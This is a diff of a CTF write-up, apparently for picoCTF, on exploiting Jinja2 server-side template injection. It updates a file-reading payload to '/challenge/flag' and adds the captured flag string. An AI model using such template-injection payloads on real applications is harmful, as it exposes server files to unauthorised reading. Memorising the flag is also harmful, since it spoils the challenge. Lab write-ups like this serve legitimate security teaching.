@@ -64,16 +64,20 @@ This exposes functions like `open`, which we can use to read files.
 
 ### 7. Reading the Flag  
 
-Finally, to read the contents of the flag file, we execute:  
+To read the contents of the flag file, we execute the following:
 
 ```
-{{self.__init__.__globals__.__builtins__.open('flag.txt').read()}}
+{{self.__init__.__globals__.__builtins__.open('/challenge/flag').read()}}
 ```  
 
-Executing this payload successfully reveals the **flag**. 🎉  
+Executing this payload successfully reveals the **flag**:  
+
+```
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}
+```  
 
 ---
 
 ## Conclusion  
 
-This challenge demonstrated how an **SSTI vulnerability** can be exploited in a Python web application using Jinja2. By carefully crafting payloads, we were able to access built-in functions and retrieve sensitive information.  
+This challenge demonstrated how an **SSTI vulnerability** can be exploited in a Python web application using Jinja2. By carefully crafting payloads, we were able to access built-in functions and retrieve sensitive information.
